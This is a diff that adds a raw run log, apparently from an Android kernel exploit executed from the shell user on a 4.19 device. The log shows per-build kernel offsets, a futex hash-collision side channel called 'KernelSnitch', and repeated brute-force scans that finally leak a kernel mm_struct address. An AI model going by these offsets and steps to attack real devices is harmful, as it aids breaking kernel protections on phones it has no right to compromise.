@@ -1,0 +1,323 @@
+[26869][+] exlog open path=/sdcard/Download/log_20261021_232329.txt pid=26869 uid=2000
+[26869][+] preload starting pid=26869 log=/sdcard/Download/log_20261021_232329.txt
+[26869][+] startup context pid=26869 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[26869][+] startup limits pid=26869 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[26869][+] build config pid=26869 label=oplus_4.19.157_perf_a13 slide=pselect main=pselect
+[26869][+] p0 profile pid=26869 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8002e122e0 bootid_data=ffffff8002eb3f68 init_task=ffffff8002e1bfc0 root_tg=ffffff80030c3d80 sysctl_bootid=ffffff800335e2c4
+[26869][-] slide: dmesg Kernel Offset unavailable
+[26869][-] slide: bootid rb-gadget values derived for 4.19 (LOGGERS_0_1=ffffff8002e12208 RANDOM_BOOT_ID_DATA=ffffff8002eb3f68)
+[26869][*] memory detected ram=0x200000000 (8 GB) window_end=ffffff8200000000
+[26869][*] parameters cpu (16) mm_struct sz (340) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[26869][*] futex_init hashsize=0x800 (cpus=8)
+[26869][*] target    00000073266580d8
+[26869][*] start finding collisisons
+[26869][*] collision threshold approx=1 thr=5
+[26869][*]   00000052a17bf920 (before=4 after=13280)
+[26869][*]   00000052a2c5ce08 (before=3 after=10372)
+[26869][*]   00000052a2eb60d8 (before=4 after=12471)
+[26869][*] found 3 collisisons
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x380
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x358
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x400
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x360
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x300
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x3c0
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x480
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][-] KernelSnitch mm_struct leak failed
+[26869][*] done
+[26869][-] prepare_kernel_page retry 1/12
+[26869][*] parameters cpu (16) mm_struct sz (340) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[26869][*] futex_init hashsize=0x800 (cpus=8)
+[26869][*] target    00000073266580d8
+[26869][*] start finding collisisons
+[26869][*] collision threshold approx=1 thr=5
+[26869][*]   00000052a15f0aa8 (before=4 after=8432)
+[26869][*]   00000052a208af78 (before=4 after=9394)
+[26869][*]   00000052a22e7260 (before=4 after=10739)
+[26869][*] found 3 collisisons
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x380
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x358
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x400
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x360
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x300
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x3c0
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x480
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][-] KernelSnitch mm_struct leak failed
+[26869][*] done
+[26869][-] prepare_kernel_page retry 2/12
+[26869][*] parameters cpu (16) mm_struct sz (340) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[26869][*] futex_init hashsize=0x800 (cpus=8)
+[26869][*] target    00000073266580d8
+[26869][*] start finding collisisons
+[26869][*] collision threshold approx=2 thr=10
+[26869][*]   00000052a1e5ee18 (before=4 after=12108)
+[26869][*]   00000052a227ef18 (before=2 after=8147)
+[26869][*]   00000052a2610ba8 (before=2 after=10259)
+[26869][*] found 3 collisisons
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x380
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x358
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x400
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x360
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x300
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x3c0
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x480
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][-] KernelSnitch mm_struct leak failed
+[26869][*] done
+[26869][-] prepare_kernel_page retry 3/12
+[26869][*] parameters cpu (16) mm_struct sz (340) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[26869][*] futex_init hashsize=0x800 (cpus=8)
+[26869][*] target    00000073266580d8
+[26869][*] start finding collisisons
+[26869][*] collision threshold approx=1 thr=5
+[26869][*]   00000052a1544548 (before=4 after=8972)
+[26869][*]   00000052a2266e58 (before=4 after=8120)
+[26869][*]   00000052a35716b0 (before=4 after=8361)
+[26869][*] found 3 collisisons
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x380
+[26869][*] start bruteforcing
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] KernelSnitch retry mm_struct_sz=0x358
+[26869][*] start bruteforcing
+[26869][*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[26869][*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[26869][*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[26869][*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[26869][*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[26869][*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[26869][*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[26869][*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[26869][*] KernelSnitch mm found with mm_struct_sz=0x358 addr=ffffff8057dd5358
+[26869][*] done
+[23464][+] slide child context route=pselect pid=23464 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
